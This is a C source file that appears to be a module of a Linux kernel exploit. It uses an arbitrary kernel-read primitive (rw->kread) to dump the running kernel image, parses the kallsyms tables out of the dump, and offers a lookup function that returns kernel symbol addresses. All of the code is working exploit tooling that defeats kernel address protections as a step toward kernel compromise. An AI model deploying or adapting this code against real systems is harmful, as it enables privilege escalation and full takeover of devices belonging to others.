#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/prctl.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <ctype.h>
#include "util.h"
#include "uao.h"
#include "kernel_constants.h"
#include "rw.h"

/* This module scans a kernel image and looks for
 * kallsyms internal data structures. 
 * It assumes that the kernel executes in 64-bit mode 
 * and compiled with KALLSYMS_BASE_RELATIVE.
 * 
 * You can see how kallsyms is emitted to the kernel binary
 * by looking at scripts/kallsyms.c.
 * 
 * The kallsyms' internal data structures are aligned to 8
 * and emitted in this order:
 * 1. kallsyms_offsets: array of 4-byte offsets, one per symbol,
 *      relative from the base.
 * 2. kallsyms_relative_base: the kernel base (8 bytes).
 * 3. kallsyms_num_syms: number of symbols (4 bytes).
 * 4. kallsyms_names: compressed version of all symbols. Each symbol
 *      has length byte, followed by indices (one per byte) to the
 *      token_index table.
 * 4. kallsyms_markers: 4-byte offset emitted for each 256 symbols.
 * 5. kallsyms_token_table: contains 256 characters or string fragments
 *      chosen by the compression algorithm.
 * 6. kallsyms_token_index: array of 256 2-byte offsets, relative to the
 *      start of token_table.
 * 
 * Scanning algorithm:
 * To locate the kallsyms' internal data structures in memory, we
 * first look for a particular sequence of bytes known to be held
 * in a specific position within the token table. From the token
 * table, we can find the token_index table by counting how many
 * string fragments there are. kallsyms_markers is found by searching
 * backwards from token_table, taking advantage of the fact the the 
 * first offset emitted there is 0. As a side effect, we also know
 * the approximated number of symbols to expect (we might be off
 * by 0x100). Next, we look for the exact number of symbols based
 * on this information. We verify our guess is correct by looking
 * backward 8 bytes and see a kernel pointer there (the relative base).
 * After we successfully found the number of symbols, inferring the
 * start of kallsyms_offsets is trivial, as well as kallsyms_names.
 */

static inline u32 ptr_to_offset(struct ksym *ctx, void *p) {
    return (u32)(p - ctx->kmap);
}

static inline void *offset_to_ptr(struct ksym *ctx, u32 off) {
    return (void *)((uint8_t *)ctx->kmap + off);
}

static inline bool aligned(u32 value, u32 alignment) {
    return (value & ~(alignment-1)) == value;
}

static inline u32 align(u32 value, u32 alignment) {
    return ((value + (alignment-1)) & ~(alignment-1));
}

bool find_kallsyms_token_table(struct ksym *ctx) {
    char digits[] = {'0', '\0' , '1', '\0' , '2', '\0' , '3', '\0' , '4', '\0' , '5', '\0' , '6', '\0' , '7', '\0' , '8', '\0' , '9', '\0'};
    char *p = memmem(ctx->kmap, ctx->kmap_size, digits, sizeof(digits));
    if (p == NULL)
        return false;

    int nz = '0';
    while (nz)
        if (*--p == '\0')
            nz--;

    while (isprint(*--p));

    p++;

    u32 off = ptr_to_offset(ctx, p);
    if (!aligned(off, 8))
        return false;

    ctx->kallsyms_token_table = off;

    LOGD("kallsyms_token_table file offset 0x%x\n", off);
    return true;
}

bool find_kallsyms_token_index(struct ksym *ctx) {
    if (!ctx->kallsyms_token_table)
        return false;

    char *p = offset_to_ptr(ctx, ctx->kallsyms_token_table);
    int nz = 0x100;
    while (nz)
        if (*p++ == '\0')
            nz--;

    u32 off = align(ptr_to_offset(ctx, p), 8);

    ctx->kallsyms_token_index = off;

    LOGD("kallsyms_token_index file offset 0x%x\n", off);

    return true;
}

bool find_kallsyms_markers(struct ksym *ctx) {
    if (!ctx->kallsyms_token_table)
        return false;

    u32 *p = offset_to_ptr(ctx, ctx->kallsyms_token_table);
    p--;
    if (!*p)
        p--;
    
    u32 kallsyms_markers_end = ptr_to_offset(ctx, p + 1);

    while (*p)
        p--;

    u32 off = ptr_to_offset(ctx, p);
    ctx->kallsyms_markers = off;
    ctx->num_syms = ((kallsyms_markers_end - off) >> 2)*0x100; /* This is an approximation! */

    LOGD("kallsyms_markers file offset 0x%x\n", off);
    LOGD("kallsyms_num_syms (approx) 0x%x\n", ctx->num_syms);
    return true;
}

bool find_kallsyms_num_syms(struct ksym *ctx) {
    if (!ctx->kallsyms_markers)
        return false;

    u64 *p = offset_to_ptr(ctx, ctx->kallsyms_markers);
    for (p = p-1; (void *)p >= ctx->kmap; p--) {
        u32 num_syms = (u32)*p;
        /* Is candidate? */
        if (num_syms <= ctx->num_syms && (ctx->num_syms - num_syms) <= 0x100) {
            /* kallsyms_relative_base comes before kallsyms_num_syms. */
            u64 v = *(p-1);
            if ((v & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
                ctx->num_syms = num_syms;
                ctx->kallsyms_num_syms = ptr_to_offset(ctx, p);
                LOGD("kallsyms_num_syms (exact) 0x%x\n", ctx->num_syms);
                ctx->relative_base = *(p-1);
                ctx->kallsyms_relative_base = ptr_to_offset(ctx, p-1);
                LOGD("kallsyms_relative_base 0x%lx\n", ctx->relative_base);
                return true;
            }
        }
    }
    return false;
}

bool find_kallsyms_names(struct ksym *ctx) {
    if (!ctx->kallsyms_num_syms)
        return false;
    
    /* kallsyms_names comes after kallsyms_num_syms. */
    u32 off = align(ctx->kallsyms_num_syms + 4, 8);
    unsigned char *p = offset_to_ptr(ctx, off);
    u32 n = 0;

    while (*p) {
        p += *p + 1;
        n++;
    }

    /* Sanity check. */
    if (n != ctx->num_syms)
        return false;

    ctx->kallsyms_names = off;
    LOGD("kallsyms_names file offset 0x%x\n", ctx->kallsyms_names);
    return true;
}

bool find_kallsyms_offsets(struct ksym *ctx) {
    u32 *p = offset_to_ptr(ctx, ctx->kallsyms_relative_base - 4);
    if (!*p)
        p--;

    p -= ctx->num_syms;
    p++;
    ctx->kallsyms_offsets = ptr_to_offset(ctx, p);
    LOGD("kallsyms_offsets file offset 0x%x\n", ctx->kallsyms_offsets);
    return true;
}

bool find_kallsyms(struct rw_info *rw) {
#define RETURN_ON_FALSE(x) ({if (!(x)) return false;})
    struct ksym *ctx = &rw->ksym;
    char header[0x40];
    rw->kread(rw, rw->ki.kernel_base, header, 0x40);
    ctx->kmap_size = *(u32 *)&header[0x10];
    
    ctx->kmap = SYSCHK(mmap(NULL, ctx->kmap_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

    rw->kread(rw, rw->ki.kernel_base, ctx->kmap, ctx->kmap_size);

    RETURN_ON_FALSE(find_kallsyms_token_table(ctx));
    RETURN_ON_FALSE(find_kallsyms_token_index(ctx));
    RETURN_ON_FALSE(find_kallsyms_markers(ctx));
    RETURN_ON_FALSE(find_kallsyms_num_syms(ctx));
    RETURN_ON_FALSE(find_kallsyms_names(ctx));
    RETURN_ON_FALSE(find_kallsyms_offsets(ctx));

    LOG("[x] kallsyms found successfully!\n");

    return true;
#undef RETURN_ON_FALSE
}

u64 kallsyms_lookup_name(struct rw_info *rw, const char *name) {
    struct ksym *ctx = &rw->ksym;
    char tmp[0x100];
    unsigned char *p = offset_to_ptr(ctx, ctx->kallsyms_names);
    u16 *token_index_table = offset_to_ptr(ctx, ctx->kallsyms_token_index);
    u32 *offsets = offset_to_ptr(ctx, ctx->kallsyms_offsets);
    u32 n = 0;
    for (; *p; n++) {
        int length = *p++;
        memset(&tmp, 0, sizeof(tmp));
        while (length--) {
            int index = *p++;
            char *token = offset_to_ptr(ctx, ctx->kallsyms_token_table);
            token += token_index_table[index];
            strcat(tmp, token);
        }

        /* Skip the symbol type. */
        if (!strcmp(tmp+1, name))
            return ctx->relative_base + offsets[n];
    }
    return 0;
}
